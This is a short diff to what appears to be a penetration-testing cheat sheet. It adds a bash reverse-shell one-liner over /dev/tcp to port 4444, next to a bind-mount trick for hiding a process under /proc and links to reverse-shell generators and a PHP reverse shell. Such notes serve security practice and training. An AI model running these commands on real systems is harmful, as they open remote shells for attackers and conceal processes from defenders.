@@ -51,6 +51,11 @@ mount -o bind /tmp /proc/your-PID-here
 ```
 https://www.revshells.com/ 
 ```
+- ***Easy to Remember Reverse shell 🐚  oneliner***
+```
+bash -c "bash -i >& /dev/tcp/0.0.0.0/4444 0>&1"
+```
+
 - ***Use this github repo to get code of php-reverse-shell.php*** 
 ```
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 
